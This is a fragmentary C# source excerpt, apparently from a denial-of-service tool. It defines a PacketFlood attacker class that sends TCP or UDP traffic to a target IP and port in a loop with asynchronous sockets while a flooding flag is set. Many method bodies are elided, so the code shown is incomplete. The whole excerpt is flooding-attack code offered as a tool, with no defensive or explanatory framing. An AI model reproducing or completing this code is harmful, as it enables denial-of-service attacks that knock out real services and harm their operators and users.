...
namespace GAS.Core.Attacks {
    public class PacketFlood : IAttacker {
        ...
        private readonly FastRandom.FastRandom _rng = new FastRandom.FastRandom();
        private DataS[] _floodInfo;
        #endregion
        ...
        #endregion
        private void _SND( object a, SocketAsyncEventArgs b ) {
            try {
                var data = (DataS) a;
                //while attacking
        ...
        private class DataS {
            public Socket S;
            public byte[] Bytes;
            public SocketAsyncEventArgs Conn,
                                        Snd;
        }
        ...
        private void bw_DoWork( object sender ) {
            ...
            try {
                var rHost = new IPEndPoint(
                    IPAddress.Parse( this.Target ),
                    this.Port );
                for (var i = 0; i < this._spt; i++)
                    switch ( this._protocol ) {
                        case 1:
                            this.TCPAttack(
                                rHost,
                                this._floodInfo[ (int) sender * this._spt + i ] );
                            break;
                        case 2:
                            this.UDPAttack(
                                rHost,
        ...
        /// </summary>
        /// <param name="sender">Data with data</param>
        /// <param name="b">SocketAsyncEventArgs</param>
        private void SND( object a, SocketAsyncEventArgs b ) {
            var data = (DataS) a;
            try {
                //while attacking
                while ( this.IsFlooding ) {
                    ...
                    ////data._sendArgs.UserToken = data;

                    //try connect async
                    //if async => exit function, OnDataSent will be invoked by event
        ...
        /// </summary>
        /// <param name="sender">DataS with data</param>
        /// <param name="b">SocketAsyncEventArgs</param>
        private void OnConnected( object a, SocketAsyncEventArgs b ) {
            var data = (DataS) a;
            try {
        ...
        private void RefreshBuffer( DataS data ) {
